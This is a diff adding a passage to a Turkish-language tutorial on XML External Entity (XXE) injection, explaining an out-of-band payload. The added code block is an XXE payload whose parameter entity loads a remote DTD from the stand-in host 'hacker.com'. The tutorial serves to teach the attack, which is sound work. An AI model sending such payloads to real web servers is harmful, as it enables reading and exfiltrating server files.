@@ -87,3 +87,17 @@ Buradaki config dosyası okunmaya çalışıldığında xml hata verecektir.
 
 <img width="695" height="75" alt="image" src="https://github.com/user-attachments/assets/849362ca-becb-4ecd-b91c-c356bafb14f1" />
 
+Şekil üzerinden izah edilecek olursa:
+
+İlk olarak web sunucusuna aşağıdaki payload gönderilir. Payloaddaki entity'de, adres kısmında bir dtd var ve bunun remote olarak alınması istenmekte. Peşinden de remote'taki değerler ne ise xml parser'a verilecek.
+
+```
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "http://hacker.com/test.dtd">
+%remote;
+%int;
+%trick;
+]>
+```
+
